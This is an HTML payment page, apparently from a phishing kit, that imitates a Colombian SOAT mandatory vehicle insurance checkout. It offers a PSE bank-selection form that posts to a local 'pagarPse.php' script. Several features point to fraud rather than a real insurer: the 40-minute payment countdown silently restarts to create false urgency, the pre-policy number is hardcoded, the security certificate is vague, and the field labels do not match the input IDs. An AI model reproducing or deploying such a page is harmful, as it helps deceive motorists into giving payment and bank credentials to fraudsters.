<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOAT - Seguro Obligatorio</title>
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.2/css/all.css" integrity="sha384-XxNLWSzCxOe/CFcHcAiJAZ7LarLmw3f4975gOO6QkxvULbGGNDoSOTzItGUG++Q+" crossorigin="anonymous">
    <link rel="shortcut icon" href="../../../assets/favicon.ico" type="image/x-icon">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../../scss/primero.css">
    <link rel="stylesheet" href="../../../scss/segundo.css">
    <link rel="stylesheet" href="../../../scss/tercera.css">
    <link rel="stylesheet" href="../../../scss/addClass.css">
    <!-- <script src="../../../js/getQr.js"></script> -->
    <script src="../../../js/logicaPago.js"></script>
    <script src="../../../js/animationPay.js"></script>
    <script src="../../../js/jquery.alphanum.js"></script>
</head>

<body>
    <main>
        <componente-header size="100%">
            <div class="header">
                <style>
                    .header {
                        background: #0033a0;
                        position: relative;
                        z-index: 0
                    }

                    .navbar-component__logo {
                        height: 54px;
                        margin: 4px 0;
                        background: var(--logo);
                        background-repeat: no-repeat;
                        width: 230px;
                        background-size: 230px;
                        background-position: center left
                    }

                    @media(min-width: 768px) {
                        .navbar-component__logo {
                            height: 63px;
                            background-size: contain;
                            width: 300px;
                            margin: 0
                        }
                    }
                </style>
                <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
                <div class="header2">
                    <div class="container">
                        <nav class="navbar navbar-component flex-column flex-lg-row p-0 pr-0">
                            <a class="navbar-brand align-self-center align-self-lg-end p-0 m-0" href="index.html#">
                                <div class="main-logo"></div>
                            </a>
                            <div class="mt-1 mb-3 my-lg-0 align-self-center align-self-lg-end pb-lg-3">
                                <div class="breadcrumb-container">
                                    <style>
                                        .steps__item {
                                            font-family: var(--font-family-din-regular)
                                        }

                                        .steps__item_active .steps__step {
                                            background-color: var(--breadcrumb-selected-color);
                                            color: var(--color-breadcrumb-step-active)
                                        }

                                        .steps__item_active .steps__btn {
                                            color: var(--breadcrumb-text-color-active, var(--breadcrumb-text-color));
                                            font-weight: 600;
                                            display: inline-block
                                        }

                                        .steps__step {
                                            display: inline-block;
                                            height: 22px;
                                            width: 22px;
                                            background-color: #dfdfdf;
                                            border-radius: 50%;
                                            font-size: 1rem;
                                            color: var(--breadcrumb-text-color);
                                            text-align: center
                                        }

                                        .steps__step_success {
                                            background-color: var(--color-breadcrumb-success) !important
                                        }

                                        .steps__step_success .icomoon-sel-success-input {
                                            font-size: 0.8rem;
                                            font-weight: bold
                                        }

                                        .steps__btn {
                                            display: none;
                                            font-size: 0.8rem;
                                            background: transparent;
                                            border: 0;
                                            cursor: pointer;
                                            outline: none;
                                            color: var(--color-breadcrumb)
                                        }

                                        @media(min-width: 768px) {
                                            .steps__btn {
                                                display: inline-block
                                            }
                                        }

                                        .steps__btn_success {
                                            color: var(--color-breadcrumb-success) !important
                                        }

                                        .check-color {
                                            color: var(--breadcrumb-check-color)
                                        }
                                    </style>
                                    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
                                    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.2/css/all.css" integrity="sha384-XxNLWSzCxOe/CFcHcAiJAZ7LarLmw3f4975gOO6QkxvULbGGNDoSOTzItGUG++Q+" crossorigin="anonymous">
                                    <ul class="nav">
                                        <li class="mr-1 mr-md-4 step-one">
                                            <div class="d-flex">
                                                <span class="mr-md-1 step-one-span" style="margin-right: 0px !important;">
                                                    <i class="fas nikefa fa-xs" style="font-weight:500;"></i>
                                                </span>
                                                <button class="d-md-inline-block step-one-btn">Cotización</button>
                                            </div>
                                        </li>
                                        <li class="mr-1 mr-md-4">
                                            <div class="d-flex">
                                                <span class="mr-md-1 step-one-span">
                                                    <i class="fas nikefa fa-xs" style="font-weight:500;"></i>
                                                </span>
                                                <button class="d-md-block step-one-btn ">Datos</button>
                                            </div>
                                        </li>
                                        <li class="mr-1 mr-md-4">
                                            <div class="d-flex">
                                                <span class="mr-md-1 step-one-span" style="font-weight:500;">3</span>
                                                <button class="d-md-block step-one-btn">Pago</button>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </nav>
                    </div>
                </div>
            </div>
        </componente-header>

        <componente-header2>
            <div>
                <div class="horizontal-nav navhorizontal3">
                    <div>

                    </div>
                </div>
            </div>
        </componente-header2>

        <componente-principal>
            <div class="flex-grow-1">
                <div class="container py-2 my-1 boxPago">
                    <button id="btnBackAparPago" class="d-block mb-2 btnBack">
                        <i class="fas fa-chevron-left mr-1" aria-hidden="true"></i>
                        Regresar</button>

                    <div class="row">
                        <div class="col-12 col-lg-8 d-flex justify-content-center">
                            <div class="d-flex justify-content-center align-items-center my-4 cuentaAtras">
                                <i class="far fa-info-circle colorca mr-3"></i>
                                <label class="m-0"> Recuerda que tienes
                                    <span class="font-weight-bold mx-1">
                                        <span id="cuentaAtrasVivo">40:00</span>
                                    </span>minutos para realizar tu pago.
                                </label>
                            </div>
                        </div>
                        <div class="col-12 col-sm-12 col-lg-8 tablapay mb-3 mb-md-0">
                            <ul class="nav-tabs d-flex nav">
                                <li class="flex-grow-1 nav-item">
                                    <a class="text-center nav-link activomanito0" href="index.html#">PSE y otros medios de pago
                                        <i class="fal billeteraIcon ml-2"></i>
                                    </a>

                                    <a class="text-center nav-link activomanito0 tituloarribabancoslo displayNone" href="index.html#">Pago mediante PSE‎ ‎ ‎ ‎
                                        <i class="fal billeteraIcon ml-2"></i>
                                    </a>
                                </li>
                            </ul>
                            <div class="metodosBox">
                                <div class="tab-pane fade show active">
                                    <div id="apartadoPredeterminado" class="p-3"> <!-- displayNone -->
                                        <h2 class="mb-3 titleRP">Tus opciones para realizar el pago:</h2>
                                        <div class="row mb-4 flex-column">
                                            <div class="col-12 d-block d-md-flex align-items-center justify-content-start my-2">
                                                <label class="labelselectpse d-block position-relative my-4">
                                                    <div class="pselcetpse1">
                                                        <h3>Cuenta ahorros/corriente</h3>
                                                    </div>
                                                    <span class="spanselectpse position-absolute"></span>
                                                </label>
                                                <img src="../../../assets/mobile_icon_01.png" alt="">
                                            </div>
                                            <!-- <div class="col-12 d-block d-md-flex align-items-center justify-content-start my-2">
                                                <label class="labelselectpse d-block position-relative my-4">
                                                    <div class="pselcetpse1">
                                                        <h3>Cuenta de ahorros y Corriente (Fuera de servicio)</h3>
                                                    </div>
                                                    <span class="spanselectpse2 position-absolute"></span>
                                                    <input id="" type="hidden">
                                                </label>
                                                <img class="bcjajajs" src="../../../assets/m2.svg" alt="">
                                            </div> -->
                                        </div>
                                        <div class="row align-items-center">
                                            <div class="col-md-6 text-center align-middle">
                                                <h2 class="m-0 h2tap">TOTAL A PAGAR: $<span id="valorPago3"></span></h2>
                                            </div>
                                            <div class="col-md-6 text-center">
                                                <button type="button" id="btnPagarStep33" class="py-2 mt-2 mt-lg-0 btnpagar34">PAGAR</button>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="apartadoQr" class="p-3 displayNone"> <!-- displayNone -->
                                        <form id="formPse" action="pagarPse.php" method="POST">
                                        <div class="cajaQrMillon">
                                            <div class="notaQr">
                                                <img src="../../../assets/footer_decoration.png" alt="">
                                                <b>Ingresa tus datos</b>
                                                <p>El pago lo harás mediante PSE</p>
                                            </div>
                                            <div class="position-relative inputsPse">
                                                <div class="d-flex align-items-center fechahptas position-relative">
                                                    <select class="py-2 px-3 datepickerClass cf" type="text" id="typeDocument" name="bank">
                                                        <option value="0">Seleccione su banco</option>
                                                        <option value='ALIANZA FIDUCIARIA'>ALIANZA FIDUCIARIA</option>
                                                        <option value='BAN100'>BAN100</option>
                                                        <option value='BANCAMIA S.A.'>BANCAMIA S.A.</option>
                                                        <option value='BANCO AGRARIO'>BANCO AGRARIO</option>
                                                        <option value='BANCO AV VILLAS'>BANCO AV VILLAS</option>
                                                        <option value='BANCO BBVA COLOMBIA S.A.'>BANCO BBVA COLOMBIA S.A.</option>
                                                        <option value='BANCO CAJA SOCIAL'>BANCO CAJA SOCIAL</option>
                                                        <option value='BANCO COOPERATIVO COOPCENTRAL'>BANCO COOPERATIVO COOPCENTRAL</option>
                                                        <option value='BANCO DE BOGOTA'>BANCO DE BOGOTA</option>
                                                        <option value='BANCO DE OCCIDENTE'>BANCO DE OCCIDENTE</option>
                                                        <option value='BANCO FALABELLA'>BANCO FALABELLA</option>
                                                        <option value='BANCO FINANDINA S.A. BIC'>BANCO FINANDINA S.A. BIC</option>
                                                        <option value='BANCO GNB SUDAMERIS'>BANCO GNB SUDAMERIS</option>
                                                        <option value='BANCO ITAU'>BANCO ITAU</option>
                                                        <option value='BANCO J.P. MORGAN COLOMBIA S.A.'>BANCO J.P. MORGAN COLOMBIA S.A.</option>
                                                        <option value='BANCO MUNDO MUJER S.A.'>BANCO MUNDO MUJER S.A.</option>
                                                        <option value='BANCO PICHINCHA S.A.'>BANCO PICHINCHA S.A.</option>
                                                        <option value='BANCO POPULAR'>BANCO POPULAR</option>
                                                        <option value='BANCO SANTANDER COLOMBIA'>BANCO SANTANDER COLOMBIA</option>
                                                        <option value='BANCO SERFINANZA'>BANCO SERFINANZA</option>
                                                        <option value='BANCO UNION antes GIROS'>BANCO UNION antes GIROS</option>
                                                        <option value='BANCOLOMBIA'>BANCOLOMBIA</option>
                                                        <option value='BANCOOMEVA S.A.'>BANCOOMEVA S.A.</option>
                                                        <option value='BOLD CF'>BOLD CF</option>
                                                        <option value='CFA COOPERATIVA FINANCIERA'>CFA COOPERATIVA FINANCIERA</option>
                                                        <option value='CITIBANK'>CITIBANK</option>
                                                        <option value='COINK SA'>COINK SA</option>
                                                        <option value='COLTEFINANCIERA'>COLTEFINANCIERA</option>
                                                        <option value='CONFIAR COOPERATIVA FINANCIERA'>CONFIAR COOPERATIVA FINANCIERA</option>
                                                        <option value='COTRAFA'>COTRAFA</option>
                                                        <option value='Crezcamos-MOSí'>Crezcamos-MOSí</option>
                                                        <option value='DALE'>DALE</option>
                                                        <option value='DING'>DING</option>
                                                        <option value='FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO'>FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
                                                        <option value='GLOBAL66'>GLOBAL66</option>
                                                        <option value='IRIS'>IRIS</option>
                                                        <option value='JFK COOPERATIVA FINANCIERA'>JFK COOPERATIVA FINANCIERA</option>
                                                        <option value='LULO BANK'>LULO BANK</option>
                                                        <option value='MOVII S.A.'>MOVII S.A.</option>
                                                        <option value='NEQUI'>NEQUI</option>
                                                        <option value='NU'>NU</option>
                                                        <option value='POWWI'>POWWI</option>
                                                        <option value='RAPPIPAY'>RAPPIPAY</option>
                                                        <option value='SCOTIABANK COLPATRIA'>SCOTIABANK COLPATRIA</option>
                                                        <option value='UALÁ'>UALÁ</option>
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="position-relative inputsPse">
                                                <div class="d-flex align-items-center fechahptas position-relative">
                                                    <input class="py-2 px-3 datepickerClass cf" type="text" id="telephone" maxlength="10" inputmode="numeric">
                                                    <label class="mx-2 px-2 mb-0 labelDni10" for="telephone">Número de documento</label>
                                                </div>
                                            </div>
                                            <div class="position-relative inputsPse">
                                                <div class="d-flex align-items-center fechahptas position-relative">
                                                    <input class="py-2 px-3 datepickerClass cf" type="text" id="numeroDni" maxlength="40">
                                                    <label class="mx-2 px-2 mb-0 labelDni2" for="numeroDni">Correo electrónico</label>
                                                </div>
                                            </div>
                                            <div class="fondoAzulParaElComoLoHago">
                                                <span>¿Como lo hago?</span>
                                            </div>
                                        </div>
                                        <p style="margin: 20px 20px 10px 30px;">Una vez ingresados tus datos, haz click en <b>CONFIRMAR</b> y el sistema se encargará de validar tu <b>Información</b> y redireccionarte al pago.</p>
                                        <div class="row align-items-center" style="justify-content: center;">
                                            <div class="col-md-6 text-center">
                                                <button type="submit" id="btnPagarStep44" class="py-2 mt-2 mt-lg-0 btnpagar34" disabled>CONFIRMAR</button>
                                            </div>
                                        </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-sm-12 col-lg-4 mt-5 mt-lg-0">
                            <div class="boxFactura p-3 position-sticky">
                                <h5 class="h5bsd m-0">Resumen:</h5>
                                <ul class="ul3dasd">
                                    <li class="list__item">
                                        <span class="list__item_key">Clase:</span> <span id="clasePago"></span>
                                    </li>
                                    <li class="list__item">
                                        <span class="list__item_key">Tipo de servicio:</span> <span id="tipoSPago">PARTICULAR</span>
                                    </li>
                                    <li class="list__item">
                                        <span class="list__item_key">Modelo:</span> <span id="modeloPago"></span>
                                    </li>
                                    <li class="list__item">
                                        <span class="list__item_key">Cilindraje:</span> <span id="ccPago"></span>
                                    </li>
                                 
                                    <li class="list__item">
                                        <span class="list__item_key">Placa:</span> <span id="placaPago" style="text-transform: uppercase;"></span>
                                    </li>
                                    <li class="list__item">
                                        <span class="list__item_key">Prepoliza:</span> <span id="prepolizaPago">096372632312</span>
                                    </li>
                                    <li class="list__item">
                                        <span class="list__item_key">Prima:</span> $<span id="primaPago"></span>
                                    </li>
                                    <li class="list__item">
                                        <span class="list__item_key">Descuentos:</span> $0.00
                                    </li>
                                    <li class="list__item">
                                        <span class="list__item_key">Valor Total:</span> $<span id="valorPago"></span>.00
                                    </li>
                                </ul>
                                <hr>
                                <h4 class="h4totalitoapagar"> TOTAL A PAGAR: $<span id="valorPago2"></span> </h4>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </componente-principal>

        <componente-footer>
            <footer class="footer footerjkasds2">
                <div class="container">
                    <div class="row pt-3 pb-3">
                        <div class="niideamanito col-12 col-lg-6 footer-container_border-right d-flex align-items-center justify-content-center align-items-lg-center justify-content-lg-end">
                            <p class="mb-0"> Copyright © 2025. Todos los derechos reservados </p>
                        </div>
                        <div class="niideamanito2 col-12 col-lg-6 d-flex align-items-center justify-content-center justify-content-lg-start flex-column flex-lg-row mt-3 mt-lg-0">
                            <p class="pr-2 mb-0"> Contamos con el certificado de seguridad: </p>
                            <div class="list-inline">
                                <figure class="list-inline-item">
                                                                                <img src="../../../assets/security_badge.png" alt="">
                                </figure>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </componente-footer>

        <loader id="loader" class="loaderrr">
            <div class="fondo"></div>
            <div class="contenidoLoader">
                <div>
                    <img src="../../../assets/loader.gif" alt="">
                </div>
                <p>Cargando...</p>
            </div>
        </loader>
    </main>
    <script>
        function startTimer(duration, display) {
            var timer = duration,
                minutes,
                seconds;
            setInterval(function() {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.text(minutes + ":" + seconds);

                if (--timer < 0) {
                    timer = duration;
                }
            }, 1000);
        }

        var display = $("#cuentaAtrasVivo");
        var timeLeft = 2400;

        startTimer(timeLeft, display);
    </script>

    <script>
        $('#formPse').on('submit', function(e) {
            var bank = $('#typeDocument').val();
            if (!bank || bank === '0') {
                e.preventDefault();
                alert('Por favor, selecciona tu banco.');
            }
        });
        $('#typeDocument').on('change', function() {
            var bank = $(this).val();
            if (bank && bank !== '0') {
                $('#btnPagarStep44').prop('disabled', false);
            } else {
                $('#btnPagarStep44').prop('disabled', true);
            }
        });
    </script>
    
    </body>
</html>